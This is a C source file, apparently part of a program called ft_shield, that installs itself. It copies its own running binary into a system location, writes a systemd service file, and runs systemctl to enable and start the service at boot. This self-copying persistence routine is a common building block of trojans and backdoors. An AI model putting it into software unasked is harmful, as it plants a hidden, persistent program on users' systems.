#include <unistd.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/wait.h>
#include <signal.h>

#include "ft_shield.h"
#include "logger.h"

int is_installed()
{
    if (access(BIN_LOCATION, F_OK | X_OK) == 0 &&
        access(SYSTEMD_SERVICE_FILE, F_OK) == 0)
    {
        log_to_file("ft_shield is already installed");
        return 1;
    }
    return 0;
}

static int copy_binary()
{
    char *src_path = realpath("/proc/self/exe", NULL);
    if (src_path == NULL)
    {
        log_to_file("Failed to get binary path");
        return 0;
    }

    int src_fd = open(src_path, O_RDONLY);
    if (src_fd < 0)
    {
        log_to_file("Failed to open source file");
        free(src_path);
        return 0;
    }

    int dst_fd = open(BIN_LOCATION, O_WRONLY | O_CREAT | O_TRUNC, 0755);
    if (dst_fd < 0)
    {
        log_to_file("Failed to open destination file");
        close(src_fd);
        free(src_path);
        return 0;
    }

    char buffer[PAGE_SIZE];
    ssize_t bytes_read;
    while ((bytes_read = read(src_fd, buffer, sizeof(buffer))) > 0)
    {
        if (write(dst_fd, buffer, bytes_read) != bytes_read)
        {
            log_to_file("Failed to write to destination file");
            unlink(BIN_LOCATION);
            close(src_fd);
            close(dst_fd);
            free(src_path);
            return 0;
        }
    }

    close(src_fd);
    close(dst_fd);
    free(src_path);
    return 1;
}

static int create_systemd()
{
    FILE *service_file = fopen(SYSTEMD_SERVICE_FILE, "w");
    if (service_file == NULL)
    {
        log_to_file("Failed to create service file");
        return 0;
    }

    fprintf(service_file, SYSTEMD_CONFIG, BIN_LOCATION, PID_FILE);

    fclose(service_file);

    return 1;
}

static int execute_system_command(char *command)
{
    pid_t pid = fork();

    if (pid == 0)
    {
        char *args[] = {"/bin/sh", "-c", command, NULL};
        log_to_file("Executing command: %s", command);
        execvp("/bin/sh", args);
        log_to_file("Failed to execute command: %s", command);
        exit(1);
    }
    else if (pid < 0)
    {
        log_to_file("Failed to fork process for command: %s", command);
        return 0;
    }

    return 1;
}

static int enable_service()
{
    char command[CHAR_BUFFER];

    if (!execute_system_command("systemctl --no-pager daemon-reload"))
    {
        log_to_file("Failed to reload systemd");
        return 0;
    }

    snprintf(command, sizeof(command), "systemctl --no-pager enable %s", SERVICE_NAME);
    if (!execute_system_command(command))
    {
        log_to_file("Failed to enable service");
        return 0;
    }

    snprintf(command, sizeof(command), "systemctl --no-pager start %s", SERVICE_NAME);
    if (!execute_system_command(command))
    {
        log_to_file("Failed to start service");
        return 0;
    }

    return 1;
}

int install_self()
{
    if (copy_binary() &&
        create_systemd() &&
        enable_service())
    {
        log_to_file("ft_shield installed successfully");
        return 1;
    }

    unlink(BIN_LOCATION);
    unlink(SYSTEMD_SERVICE_FILE);
    log_to_file("Failed to install ft_shield");
    return 0;
}
